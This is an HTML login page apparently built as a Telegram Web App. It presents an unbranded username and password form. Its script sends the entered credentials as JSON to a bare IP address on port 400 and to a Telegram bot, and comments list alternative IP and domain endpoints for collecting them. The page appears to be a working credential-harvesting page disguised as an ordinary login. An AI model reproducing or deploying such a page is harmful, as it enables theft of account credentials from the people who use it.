<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Form</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-form {
            background-color: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            width: 300px;
        }
        .login-form h2 {
            margin-bottom: 20px;
            font-size: 24px;
            text-align: center;
        }
        .login-form input {
            width: 100%;
            padding: 10px;
            margin-bottom: 15px;
            border: 1px solid #ccc;
            border-radius: 4px;
            font-size: 16px;
        }
        .login-form button {
            width: 100%;
            padding: 10px;
            background-color: #007bff;
            color: #fff;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            cursor: pointer;
        }
        .login-form button:hover {
            background-color: #0056b3;
        }
    </style>
</head>
<body>
<div class="login-form">
    <h2>Login</h2>
    <form id="loginForm">
        <input type="text" id="username" placeholder="Username" required>
        <input type="password" id="password" placeholder="Password" required>
        <button type="submit">Login</button>
    </form>

<!--    <form method="POST" action="https://45.67.84.114:400/getData">-->
<!--        <input type="text" name="username" placeholder="Username" required>-->
<!--        <input type="password" name="password" placeholder="Password" required>-->
<!--        <button type="submit">Login</button>-->
<!--    </form>-->

</div>

<script src="https://telegram.org/js/telegram-web-app.js"></script>
<script>

    document.getElementById('loginForm').addEventListener('submit', function (event) {
        event.preventDefault(); // Prevent form submission

        // Get form data
        const username = document.getElementById('username').value;
        const password = document.getElementById('password').value;

        // Define the URL and data
        // const url = 'http://localhost:8080/getData';
        //const url = 'https://94.131.11.43:443/getData';
        //const url = 'https://manager-group.com:400/getData';
        const url = 'https://45.67.84.114:400/getData';

// Make a POST request
        fetch(url, {
            method: 'POST', // Specify the request method
            headers: {
                'Content-Type': 'application/json' // Set the content type to JSON
            },
            body: JSON.stringify({username: username, password: password}) // Convert the data to JSON
        })
            .then(response => {
                if (!response.ok) {
                    throw new Error('Network response was not ok');
                }
                return response.json(); // Parse the JSON response
            })
            .then(responseData => {
                console.log('Success:', responseData); // Handle the response data
            })
            .catch(error => {
                console.error('Error:', error); // Handle errors
            });

        // Send data to Telegram bot (via Telegram Web App API)
        Telegram.WebApp.sendData(JSON.stringify({username: username, password: password}));
        // Telegram.WebApp.sendData('{"username":"andeson", "password":"1234"}');

        // Close the Web App
        Telegram.WebApp.close();
    });
</script>
</body>
</html>
